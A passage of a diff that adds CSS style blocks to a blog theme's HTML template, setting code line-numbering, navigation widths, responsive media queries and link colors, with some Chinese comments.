+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
